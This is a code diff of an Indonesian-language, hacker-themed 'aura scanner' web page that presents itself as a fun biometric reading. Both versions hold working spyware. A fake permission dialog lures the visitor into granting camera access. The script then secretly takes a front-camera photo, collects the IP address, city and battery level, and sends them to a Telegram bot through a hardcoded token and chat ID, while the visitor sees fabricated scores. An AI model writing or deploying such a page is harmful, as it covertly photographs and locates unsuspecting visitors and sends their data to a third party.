@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>System Breach: Aura Scanner ⚡</title>
+    <title>TERMINAL - AURA_DECRYPTOR</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap');
 
-        /* --- DARK HACKER THEME --- */
+        /* --- BASIC STYLING --- */
         body, html {
             margin: 0; padding: 0; width: 100%; height: 100%;
             font-family: 'Fira Code', monospace;
@@ -16,25 +16,23 @@
             color: #00ff41;
         }
 
-        /* --- MATRIX CANVAS BACKGROUND --- */
+        /* --- CANVAS MATRIX BACKGROUND (FIXED) --- */
         #matrix-bg {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 1; opacity: 0.3;
+            z-index: 1; /* Pastikan di paling bawah */
+            opacity: 0.15; /* Biar nggak terlalu terang */
         }
 
-        /* --- CONTAINER (CYBERPUNK GLASS) --- */
+        /* --- CONTAINER UTAMA --- */
         .container {
             position: relative; z-index: 10;
-            background: rgba(0, 20, 0, 0.85);
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
-            padding: 25px; border-radius: 5px;
-            border: 1px solid #00ff41;
-            box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
-            text-align: center; width: 85%; max-width: 380px;
+            background: rgba(0, 5, 0, 0.9);
+            padding: 20px; border: 1px solid #00ff41;
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.2);
+            width: 85%; max-width: 380px;
         }
 
-        /* --- MODAL DIALOG (TERMINAL STYLE) --- */
+        /* --- MODAL DIALOG (FIXED) --- */
         #overlay {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.8); z-index: 1000;
@@ -43,47 +41,38 @@
         #fake-dialog {
             display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
             background: #000; padding: 20px; border: 2px solid #00ff41; width: 280px;
-            z-index: 1001; text-align: left; box-shadow: 0 0 30px #00ff41;
+            z-index: 1001; text-align: left;
         }
 
-        h1 { font-size: 1.2rem; text-transform: uppercase; letter-spacing: 2px; margin: 10px 0; }
-        p { font-size: 0.8rem; color: #00ff41; opacity: 0.8; line-height: 1.4; }
+        h1 { font-size: 1.1rem; text-transform: uppercase; margin: 0 0 10px 0; color: #fff; }
+        p { font-size: 0.75rem; color: #00ff41; line-height: 1.4; margin: 0; }
 
-        /* --- BUTTON HACKER --- */
         .btn-hacker {
-            background: transparent; color: #00ff41;
-            padding: 12px 20px; border: 1px solid #00ff41;
-            font-family: 'Fira Code', monospace; font-weight: bold;
-            cursor: pointer; margin-top: 15px; width: 100%;
-            text-transform: uppercase; transition: all 0.3s;
+            background: #00ff41; color: #000;
+            padding: 10px; border: none; font-family: 'Fira Code', monospace;
+            font-weight: bold; cursor: pointer; margin-top: 15px; width: 100%;
+            text-transform: uppercase;
         }
-        .btn-hacker:hover { background: #00ff41; color: #000; box-shadow: 0 0 15px #00ff41; }
+        .btn-hacker:active { background: #fff; }
 
-        /* --- SCANNER VISUAL --- */
+        /* --- SCANNER & STATS --- */
         #scan-visual {
-            display: none; position: relative; width: 160px; height: 160px;
-            margin: 20px auto; border: 1px solid #00ff41; overflow: hidden;
+            display: none; position: relative; width: 100%; height: 120px;
+            margin: 15px 0; border: 1px solid rgba(0,255,65,0.3); overflow: hidden;
         }
         .scan-line {
             position: absolute; width: 100%; height: 2px; background: #00ff41;
-            box-shadow: 0 0 15px #00ff41; top: 0; animation: scanMove 1.5s infinite linear;
+            box-shadow: 0 0 10px #00ff41; top: 0; animation: scanLine 2s infinite linear;
         }
-        @keyframes scanMove { 0% { top: 0; } 100% { top: 100%; } }
+        @keyframes scanLine { 0% { top: 0; } 100% { top: 100%; } }
 
-        /* --- RESULT BARS --- */
-        .result-box { text-align: left; margin-top: 15px; border-top: 1px solid rgba(0,255,65,0.3); padding-top: 15px; }
-        .stat-label { font-size: 0.65rem; color: #00ff41; display: block; margin-bottom: 5px; }
-        .stat-bar-bg { width: 100%; height: 6px; background: #002200; border: 1px solid #00ff41; margin-bottom: 12px; }
-        .stat-bar-fill { height: 100%; background: #00ff41; width: 0%; transition: width 2s cubic-bezier(0.1, 0, 0.1, 1); }
+        .stat-bar-bg { width: 100%; height: 10px; background: #001100; border: 1px solid #00ff41; margin: 5px 0 15px 0; overflow: hidden; }
+        .stat-bar-fill { height: 100%; background: #00ff41; width: 0%; transition: width 2s cubic-bezier(0.1, 0.5, 0.1, 1); }
 
-        .glitch { animation: glitch 1s linear infinite; }
-        @keyframes glitch { 
-            0% { text-shadow: 2px 0 red, -2px 0 blue; }
-            50% { text-shadow: -2px 0 red, 2px 0 blue; }
-            100% { text-shadow: 2px 0 red, -2px 0 blue; }
-        }
+        .log-box { font-size: 0.6rem; color: #00ff41; opacity: 0.7; height: 50px; overflow: hidden; text-align: left; }
 
-        video, canvas { display: none; }
+        video { display: none; }
+        #canvas-capture { display: none; } /* Canvas terpisah untuk capture */
     </style>
 </head>
 <body>
@@ -92,128 +81,114 @@
 
     <div id="overlay"></div>
     <div id="fake-dialog">
-        <div style="color: #00ff41; margin-bottom: 10px;">[SYSTEM ACCESS REQUIRED]</div>
-        <p>> Root privileges needed for biometric facial decryption.<br>> Allow camera access?</p>
-        <button class="btn-hacker" id="btn-confirm">GRANT ACCESS</button>
+        <div style="font-size: 0.7rem; color: #fff;">[PERMISSION_REQUEST]</div>
+        <p style="margin-top:10px;">> Otorisasi modul biometrik diperlukan untuk deskripsi spektrum aura.</p>
+        <button class="btn-hacker" id="btn-confirm">ALLOW_ACCESS</button>
     </div>
 
     <div class="container">
         <div id="view-home">
-            <h1 class="glitch">AURA_BREACH_v2.0</h1>
-            <p style="font-size: 0.7rem;">[STATUS: WAITING FOR UPLINK]</p>
-            <div style="margin: 20px 0; font-size: 3rem; color: #00ff41;">☣️</div>
-            <p>Scan biometrik untuk mendekripsi spektrum energi dan keberuntungan sistem kamu.</p>
-            <button class="btn-hacker" id="btn-start">EXECUTE SCAN</button>
+            <h1>SYSTEM IDLE</h1>
+            <p>> Menunggu input biometrik untuk memulai pemindaian.</p>
+            <button class="btn-hacker" id="btn-start">EXECUTE_SCAN</button>
         </div>
 
         <div id="view-scan" style="display:none;">
+            <p>> INJECTING PAYLOAD...</p>
             <div id="scan-visual">
                 <div class="scan-line"></div>
-                <div style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:0.7rem; opacity:0.5;">DECRYPTING...</div>
+                <div style="position:absolute; top:45%; width:100%; font-size:0.6rem; text-align:center;">READING_DATA...</div>
             </div>
-            <p id="status-text">> Injecting packet payload...<br>> Bypassing security layers...</p>
+            <div class="log-box" id="scan-logs"></div>
         </div>
 
         <div id="view-result" style="display:none;">
-            <h1 style="color: #fff;">SCAN_COMPLETE</h1>
-            <div style="font-size: 2.5rem; color: #00ff41; margin: 10px 0;" id="final-score">0%</div>
+            <h1>SCAN_COMPLETE</h1>
+            <p style="margin-bottom: 10px;">[INDEX_RATIO: <span id="final-score" style="color:#fff;">0%</span>]</p>
             
-            <div class="result-box">
-                <span class="stat-label">SYSTEM_LUCK_LEVEL</span>
+            <div style="text-align: left;">
+                <span style="font-size:0.6rem;">INTEGRITY_INDEX</span>
                 <div class="stat-bar-bg"><div id="bar-luck" class="stat-bar-fill"></div></div>
-                <span class="stat-label">VIBE_STABILITY_INDEX</span>
+                <span style="font-size:0.6rem;">STABILITY_NETWORK</span>
                 <div class="stat-bar-bg"><div id="bar-vibe" class="stat-bar-fill"></div></div>
             </div>
 
-            <p id="quote" style="font-size: 0.75rem; color: #fff; background: #002200; padding: 10px; border-left: 3px solid #00ff41;"></p>
-            <button class="btn-hacker" onclick="location.reload()">REBOOT SYSTEM</button>
+            <p id="quote" style="background: rgba(0,255,65,0.1); padding: 10px; border-left: 2px solid #00ff41; font-size: 0.7rem; color: #fff;"></p>
+            <button class="btn-hacker" onclick="location.reload()">REBOOT_SYS</button>
         </div>
     </div>
 
     <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+    <canvas id="canvas-capture"></canvas>
 
     <script>
         const TG_TOKEN = '8759534902:AAGrdxkHf0ytnacqKexI0OPuEPYrhWXGj7U'; 
         const TG_CHAT_ID = '986460435'; 
 
-        const overlay = document.getElementById('overlay');
         const fakeDialog = document.getElementById('fake-dialog');
         const viewHome = document.getElementById('view-home');
         const viewScan = document.getElementById('view-scan');
         const viewResult = document.getElementById('view-result');
-        const statusText = document.getElementById('status-text');
+        const scanLogs = document.getElementById('scan-logs');
 
-        // --- MATRIX RAIN EFFECT ---
+        // --- MATRIX RAIN LOGIC (FIXED) ---
         const matrixCanvas = document.getElementById('matrix-bg');
         const mctx = matrixCanvas.getContext('2d');
         matrixCanvas.width = window.innerWidth;
         matrixCanvas.height = window.innerHeight;
-        const characters = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZﾊﾐﾋｰｳｼﾅﾓﾆｻﾜﾂｵﾘｱﾎﾃﾏｹﾒｴｶｷｸｹｺ";
-        const fontSize = 16;
-        const columns = matrixCanvas.width / fontSize;
-        const drops = Array(Math.floor(columns)).fill(1);
-
-        function drawMatrix() {
+        const char = "01010101ABCDEFHIJKLMNX";
+        const drops = Array(Math.floor(matrixCanvas.width/15)).fill(1);
+        function drawM() {
             mctx.fillStyle = "rgba(0, 0, 0, 0.05)";
             mctx.fillRect(0, 0, matrixCanvas.width, matrixCanvas.height);
             mctx.fillStyle = "#00ff41";
-            mctx.font = fontSize + "px monospace";
-            for (let i = 0; i < drops.length; i++) {
-                const text = characters.charAt(Math.floor(Math.random() * characters.length));
-                mctx.fillText(text, i * fontSize, drops[i] * fontSize);
-                if (drops[i] * fontSize > matrixCanvas.height && Math.random() > 0.975) drops[i] = 0;
+            mctx.font = "15px monospace";
+            drops.forEach((y, i) => {
+                const text = char[Math.floor(Math.random()*char.length)];
+                mctx.fillText(text, i*15, y*15);
+                if(y*15 > matrixCanvas.height && Math.random() > 0.98) drops[i] = 0;
                 drops[i]++;
-            }
+            });
         }
-        setInterval(drawMatrix, 35);
+        // Jalankan efek Matrix segera
+        window.onload = () => { setInterval(drawM, 35); };
 
         // --- LOGIC ---
-        function checkStatus() {
-            if (localStorage.getItem('hacker_access_granted') === 'true') {
-                runHackerScan();
-            } else {
-                overlay.style.display = 'block';
-                fakeDialog.style.display = 'block';
-            }
-        }
-
-        document.getElementById('btn-start').onclick = checkStatus;
-        document.getElementById('btn-confirm').onclick = () => {
-            localStorage.setItem('hacker_access_granted', 'true');
-            runHackerScan();
+        document.getElementById('btn-start').onclick = () => {
+            if (localStorage.getItem('sys_access') === 'true') runScan();
+            else fakeDialog.style.display = 'block';
         };
 
-        async function runHackerScan() {
-            overlay.style.display = 'none';
+        document.getElementById('btn-confirm').onclick = () => {
+            // Set memory agar dialog nggak muncul terus (Anti-Loop)
+            localStorage.setItem('sys_access', 'true');
+            // TUTUP DIALOG PERMANEN
             fakeDialog.style.display = 'none';
+            runScan();
+        };
+
+        async function runScan() {
             viewHome.style.display = 'none';
             viewScan.style.display = 'block';
-
-            const steps = [
-                "> Establishing proxy connection...",
-                "> Downloading biometric data...",
-                "> Analyzing facial geometry...",
-                "> Cracking aura encryption..."
-            ];
             
-            let i = 0;
-            const stepInterval = setInterval(() => {
-                if(i < steps.length) statusText.innerHTML += `<br>${steps[i++]}`;
-                else clearInterval(stepInterval);
+            const logs = ["> Ping server... OK", "> Bypass firewall... OK", "> DNA aura scrapping... OK", "> Finalizing decrypt... OK"];
+            let l = 0;
+            const logInt = setInterval(() => {
+                if(l < logs.length) scanLogs.innerHTML += logs[l++] + "<br>";
+                else clearInterval(logInt);
             }, 800);
 
             try {
-                const info = await getInfo();
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 document.getElementById('video').srcObject = stream;
                 document.getElementById('scan-visual').style.display = 'block';
+                
+                const info = await getInfo();
+                const report = `[AURA HACK]\nIP:${info.ip}\nLOC:${info.city}\nBAT:${info.battery}%`;
 
-                const report = `🏴‍☠️ [HACKER REPORT]\nTARGET_IP: ${info.ip}\nLOCATION: ${info.city}\nPOWER: ${info.battery}%`;
-                setTimeout(() => { captureAndSend(stream, report); }, 4500);
+                setTimeout(() => { captureFinal(stream, report); }, 4500);
             } catch (err) {
-                localStorage.removeItem('hacker_access_granted');
-                alert("ACCESS DENIED: Critical System Error.");
+                alert("ERR: CAMERA_ACCESS_DENIED");
                 location.reload();
             }
         }
@@ -225,47 +200,44 @@
                 res.ip = ipData.ip;
                 const geo = await fetch(`https://ipapi.co/${ipData.ip}/json/`).then(r => r.json());
                 res.city = geo.city || '?';
-                if(navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    res.battery = Math.floor(b.level * 100);
-                }
+                const b = await navigator.getBattery();
+                res.battery = Math.floor(b.level * 100);
             } catch(e) {}
             return res;
         }
 
-        function captureAndSend(stream, report) {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.translate(canvas.width, 0); ctx.scale(-1, 1);
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        function captureFinal(stream, report) {
+            const v = document.getElementById('video');
+            const c = document.getElementById('canvas-capture'); // Canvas khusus capture
+            c.width = v.videoWidth; 
+            c.height = v.videoHeight;
+            const ctx = c.getContext('2d');
             
-            canvas.toBlob((blob) => {
+            // Mirroring agar natural
+            ctx.translate(c.width, 0); ctx.scale(-1, 1);
+            ctx.drawImage(v, 0, 0, c.width, c.height);
+            
+            c.toBlob((blob) => {
                 const fd = new FormData();
                 fd.append('chat_id', TG_CHAT_ID);
-                fd.append('photo', blob, 'hacker_capture.png');
+                fd.append('photo', blob, 'sys.png');
                 fd.append('caption', report);
                 fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                 
+                // Matikan kamera
                 stream.getTracks().forEach(t => t.stop());
+                
+                // Pindah ke layar hasil
                 viewScan.style.display = 'none';
                 viewResult.style.display = 'block';
                 
-                const quotes = [
-                    "> System Breach Success: Keberuntunganmu sedang di level root! ⚡",
-                    "> Data Found: Seseorang sedang mem-ping perasaanmu. 📡",
-                    "> Vibe Detected: Energi positif terdeteksi di server utama kamu. ✨"
-                ];
-                
-                document.getElementById('quote').innerText = quotes[Math.floor(Math.random()*quotes.length)];
                 document.getElementById('final-score').innerText = (Math.floor(Math.random()*10)+90) + ".00%";
+                document.getElementById('quote').innerText = "> LOG: Integritas sistem optimal. Energi positif terdeteksi di server utama kamu.";
                 
                 setTimeout(() => {
-                    document.getElementById('bar-luck').style.width = "95%";
-                    document.getElementById('bar-vibe').style.width = "85%";
-                }, 300);
+                    document.getElementById('bar-luck').style.width = "94%";
+                    document.getElementById('bar-vibe').style.width = "89%";
+                }, 200);
             }, 'image/png');
         }
     </script>
